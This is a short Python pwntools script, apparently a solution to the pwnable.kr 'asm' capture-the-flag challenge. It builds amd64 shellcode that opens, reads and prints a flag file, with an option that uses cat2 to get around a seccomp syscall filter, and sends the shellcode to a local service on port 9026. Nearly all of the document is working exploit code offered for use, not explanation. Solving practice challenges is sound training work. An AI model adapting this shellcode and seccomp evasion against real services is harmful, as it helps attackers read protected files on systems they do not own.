#!/usr/bin/env python

import pwn
from pwnlib import shellcraft
from pwnlib import asm
import argparse
import os

parser = argparse.ArgumentParser(description='Select a filename.')
parser.add_argument('-a', '--artisanal', nargs='?', type=str, help='Enable artisanal mode (default: False)')
parser.add_argument('filename', nargs='?', default=None, type=str, help='The name of the file to process')
args = parser.parse_args()

lFile = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

if args.artisanal:
    sc = shellcraft.amd64.pushstr(lFile)
    sc += shellcraft.amd64.mov('rdx', 0)
    sc += shellcraft.amd64.mov('rsi', 0)
    sc += shellcraft.amd64.mov('rdi', 'rsp')
    sc += shellcraft.amd64.syscall(2) # sys_open
    sc += shellcraft.amd64.read('rax', 'rsp', 120)
    sc += shellcraft.amd64.write(1, 'rsp', 150)
    sc += shellcraft.amd64.exit(0)
else:
    sc = shellcraft.amd64.linux.cat2(lFile) # cat uses a syscall that is filtered by SECCOMP, cat2 does not

print(sc)

assembled = asm.asm(sc, arch = 'amd64', os = 'linux')

if args.filename:
  print(f'Using file name, this option should only be used for testing')
  conn = pwn.process(f'{args.filename}')
else:
  conn = pwn.remote('127.0.0.1', 9026)
print('Sending...')
conn.sendline(assembled)
print(conn.recvall())
conn.close()

